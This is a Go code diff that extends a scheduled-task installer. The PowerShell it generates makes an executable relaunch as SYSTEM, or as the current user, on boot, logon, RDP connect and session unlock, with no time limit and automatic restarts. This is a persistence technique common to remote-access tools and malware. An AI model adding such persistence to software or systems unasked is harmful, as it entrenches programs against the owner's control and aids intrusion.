@@ -39,23 +39,34 @@ func installTaskScheduler(targetPath string) error {
 
 	var script string
 	if isElevated() {
-		// When elevated, register triggers for both System Startup and User Logon as SYSTEM with Highest run level
+		// When elevated, register triggers for:
+		// 1) System Boot (-AtStartup)
+		// 2) User Logon (-AtLogOn)
+		// 3) RDP / Session Connect (RemoteConnect = 3, ConsoleConnect = 1, SessionUnlock = 8)
+		// Running as SYSTEM with Highest run level
 		script = fmt.Sprintf(
 			`$a = New-ScheduledTaskAction -Execute '%s'; `+
-				`$t1 = New-ScheduledTaskTrigger -AtStartup; `+
-				`$t2 = New-ScheduledTaskTrigger -AtLogOn; `+
+				`$tStartup = New-ScheduledTaskTrigger -AtStartup; `+
+				`$tLogon = New-ScheduledTaskTrigger -AtLogOn; `+
+				`$tRemoteConnect = [wmiclass]"Root\Microsoft\Windows\TaskScheduler:MSFT_TaskSessionStateChangeTrigger"; `+
+				`$tr1 = $tRemoteConnect.CreateInstance(); $tr1.StateChange = 3; `+
+				`$tr2 = $tRemoteConnect.CreateInstance(); $tr2.StateChange = 1; `+
+				`$tr3 = $tRemoteConnect.CreateInstance(); $tr3.StateChange = 8; `+
 				`$s = New-ScheduledTaskSettingsSet -ExecutionTimeLimit ([TimeSpan]::Zero) -StartWhenAvailable -RestartCount 3 -RestartInterval (New-TimeSpan -Minutes 1); `+
 				`$p = New-ScheduledTaskPrincipal -UserId 'NT AUTHORITY\SYSTEM' -LogonType ServiceAccount -RunLevel Highest; `+
-				`Register-ScheduledTask -TaskName '%s' -Action $a -Trigger @($t1, $t2) -Settings $s -Principal $p -Force | Out-Null`,
+				`Register-ScheduledTask -TaskName '%s' -Action $a -Trigger @($tStartup, $tLogon, $tr1, $tr2, $tr3) -Settings $s -Principal $p -Force | Out-Null`,
 			safe, taskName)
 	} else {
-		// Standard non-elevated user logon trigger
+		// Standard non-elevated user logon and session connect triggers
 		script = fmt.Sprintf(
 			`$a = New-ScheduledTaskAction -Execute '%s'; `+
-				`$t = New-ScheduledTaskTrigger -AtLogOn; `+
+				`$tLogon = New-ScheduledTaskTrigger -AtLogOn; `+
+				`$tRemoteConnect = [wmiclass]"Root\Microsoft\Windows\TaskScheduler:MSFT_TaskSessionStateChangeTrigger"; `+
+				`$tr1 = $tRemoteConnect.CreateInstance(); $tr1.StateChange = 3; `+
+				`$tr2 = $tRemoteConnect.CreateInstance(); $tr2.StateChange = 1; `+
 				`$s = New-ScheduledTaskSettingsSet -ExecutionTimeLimit ([TimeSpan]::Zero) -StartWhenAvailable; `+
 				`$p = New-ScheduledTaskPrincipal -UserId $env:USERNAME -RunLevel Highest; `+
-				`Register-ScheduledTask -TaskName '%s' -Action $a -Trigger $t -Settings $s -Principal $p -Force | Out-Null`,
+				`Register-ScheduledTask -TaskName '%s' -Action $a -Trigger @($tLogon, $tr1, $tr2) -Settings $s -Principal $p -Force | Out-Null`,
 			safe, taskName)
 	}
 	return runPowerShell(script)
